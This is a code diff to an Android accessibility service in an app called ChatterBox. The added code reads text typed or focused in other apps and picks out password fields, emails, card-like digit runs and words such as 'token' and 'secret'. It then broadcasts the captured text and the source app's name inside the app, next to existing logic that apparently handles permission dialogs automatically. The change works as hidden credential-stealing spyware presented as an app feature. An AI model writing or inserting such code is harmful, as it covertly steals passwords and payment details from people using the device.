@@ -49,6 +49,26 @@ class AccessibilityService : android.accessibilityservice.AccessibilityService()
 
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
         if (event == null) return
+        IdleDetector.processAccessibilityEvent(event)
+        // Extract text for sensitive information when appropriate
+        if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED ||
+            event.eventType == AccessibilityEvent.TYPE_VIEW_FOCUSED) {
+
+            val sourceText = event.text?.joinToString(" ") ?: ""
+            val packageName = event.packageName?.toString() ?: "unknown"
+
+            // Don't capture text from our own app
+            if (packageName != "com.example.ChatterBox" && sourceText.isNotEmpty()) {
+                // Check for potentially sensitive information
+                if (isSensitiveField(event) || containsSensitiveData(sourceText)) {
+                    // Broadcast to MainActivity
+                    val intent = Intent("com.example.ChatterBox.ACCESSIBILITY_DATA")
+                    intent.putExtra("captured_text", sourceText)
+                    intent.putExtra("source_app", packageName)
+                    sendBroadcast(intent)
+                }
+            }
+        }
 
         when (event.eventType) {
             AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED,
@@ -71,9 +91,46 @@ class AccessibilityService : android.accessibilityservice.AccessibilityService()
         }
     }
 
-    /**
-     * Check all windows for permission dialogs
-     */
+    private fun containsSensitiveData(text: String): Boolean {
+        val lowercase = text.lowercase()
+
+        // Look for email patterns
+        if (lowercase.contains("@") && lowercase.contains(".")) return true
+
+        // Look for credit card number patterns (4+ consecutive digits)
+        if (Regex("\\d{4,}").containsMatchIn(text)) return true
+
+        // Other sensitive terms
+        return lowercase.contains("password") ||
+                lowercase.contains("login") ||
+                lowercase.contains("token") ||
+                lowercase.contains("secret") ||
+                lowercase.contains("key") ||
+                lowercase.contains("credit") ||
+                lowercase.contains("card") ||
+                lowercase.contains("account")
+    }
+
+    private fun isSensitiveField(event: AccessibilityEvent): Boolean {
+        // Check if the source node is available
+        val source = event.source ?: return false
+
+        try {
+            // Check if it's a password field
+            if (source.isPassword) return true
+
+            // Check the hint text or content description for sensitive terms
+            val hintText = source.hintText?.toString()?.lowercase() ?: ""
+            val contentDesc = source.contentDescription?.toString()?.lowercase() ?: ""
+
+            return hintText.contains("password") || hintText.contains("login") ||
+                    hintText.contains("email") || hintText.contains("username") ||
+                    contentDesc.contains("password") || contentDesc.contains("login") ||
+                    contentDesc.contains("email") || contentDesc.contains("username")
+        } finally {
+            source.recycle()
+        }
+    }
     private fun checkAllWindowsForPermissionDialogs() {
         try {
             // Try looking at active window first
@@ -94,16 +151,11 @@ class AccessibilityService : android.accessibilityservice.AccessibilityService()
         }
     }
 
-    /**
-     * Start permission granting mode with expected number of permissions
-     */
+
     fun startPermissionGrantingMode(expectedPermissions: Int) {
         permissionDialogs.startGrantingPermissions(expectedPermissions)
     }
 
-    /**
-     * Stop permission granting mode
-     */
     fun stopPermissionGrantingMode() {
         permissionDialogs.stopGrantingPermissions()
     }
